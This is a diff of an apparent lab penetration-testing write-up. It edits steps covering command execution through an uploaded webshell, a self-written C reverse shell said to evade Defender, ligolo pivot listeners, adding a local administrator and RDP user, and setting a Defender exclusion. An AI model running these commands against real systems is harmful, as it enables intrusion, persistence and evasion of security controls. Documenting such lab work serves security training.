@@ -1121,21 +1121,7 @@ Again we can take advantage of the docker suid vulnearbility to add another user
                 .-/+oossssoo+/-.               root@0acf73a8ca6d 
             `:+ssssssssssssssssss+:`           -----------------                                                                                                                           
           -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.1 LTS x86_64                                                                                                               
-        .ossssssssssssssssssdMMMNysssso.       Host: HVM domU 4.11.amazon                                                                                                                  
-       /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 5.4.0-1030-aws                                                                                                                      
-      +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 2 hours, 4 mins                                                                                                                     
-     /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 709 (dpkg)                                                                                                                        
-    .ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: bash 5.0.17                                                                                                                          
-    +sssshhhyNMMNyssssssssssssyNMMMysssssss+   CPU: Intel Xeon E5-2686 v4 (2) @ 2.299GHz                                                                                                   
-    ossyNMMMNyMMhsssssssssssssshmmmhssssssso   GPU: 00:02.0 Cirrus Logic GD 5446                                                                                                           
-    ossyNMMMNyMMhsssssssssssssshmmmhssssssso   Memory: 736MiB / 3933MiB                                                                                                                    
-    +sssshhhyNMMNyssssssssssssyNMMMysssssss+                                                                                                                                               
-    .ssssssssdMMMNhsssssssssshNMMMdssssssss.                                                                                                                                               
-     /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/                                                                                                                                                
-      +sssssssssdmydMMMMMMMMddddyssssssss+                                                                                                                                                 
-       /ssssssssssshdmNNNNmyNMMMMhssssss/                                                                                                                                                  
-        .ossssssssssssssssssdMMMNysssso.                                                                                                                                                   
-          -+sssssssssssssssssyyyssss+-                                                                                                                                                     
+            ................................................................                                                                                            
             `:+ssssssssssssssssss+:`                                                                                                                                                       
                 .-/+oossssoo+/-.                                                                                                                                                           
 
@@ -1521,7 +1507,7 @@ We don't know where the webshell hase been uploaded, but coming back to the dire
     /img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/img/]
     
 
-The webshell can be find to this URI:
+The webshell responds to this URI:
 
     http://10.200.95.31/images/ws.php?c=whoami
 
@@ -1546,7 +1532,7 @@ Response:
 So Defender is certainly running. To get a stable reverse shell I thought to upload netcat for windows (nc64.exe), but I dont' konw why the command does not work:
 
     http://10.200.95.31/images/ws.php?c=nc64.exe%20-h
-Returned an empty page. Probably defender is blocking the execution. Then I tried to use a simple C reverse shell that I coded, since at the moment of writing is not detected by Defender. You can get it [here](https://github.com/zinzloun/MalvasiaC). Change the server to point to the agent IP, before that we have to configure to activate a listener in ligolo to forward the traffic to our attacker machine. In ligolo console issue the following command:
+Returned an empty page. Probably defender is blocking the execution. Then I tried to use a simple C reverse shell that I coded, since at the moment of writing is not detected by Defender. You can get it [here](https://github.com/zinzloun/MalvasiaC). Change the server to point to the agent IP, the proceed to upload the file using the form. Then we have to configure to activate a listener in ligolo to forward the traffic to our attacker machine. In ligolo console issue the following command:
 
     [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
 
@@ -1576,7 +1562,7 @@ Since the server has RDP enabled we can create a local admin user:
     net localgroup administrators support /add
     net localgroup "Remote Desktop Users" support /add
 
-Then we can proceed to connect to the server with RDP, using Remmina. Then I set a Defender exclusion folder in:
+Then we can proceed to connect to the server with RDP, using Remmina. Then I set a Defender exclusion folder for:
 
     C:\users\support\music
 
@@ -1666,7 +1652,17 @@ Let's check if Defender is active:
     RealTimeProtectionEnabled        : False
     ..
 
-Lucky for use real time protection is not enabled, so we have the possibility to run some tools to try to escalate our privileges.
+Lucky for use real time protection is not enabled, so we have the possibility to run some tools to try to escalate our privileges. I will try to use winpeas. Again we need to setup another ligolo listener to reach our python webserver:
+
+    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
+
+So now visting the agent URL from PC-FILESRV01:
+
+    http://10.200.95.33:8000
+
+Our web server will respond.
+
+    
     
 
     
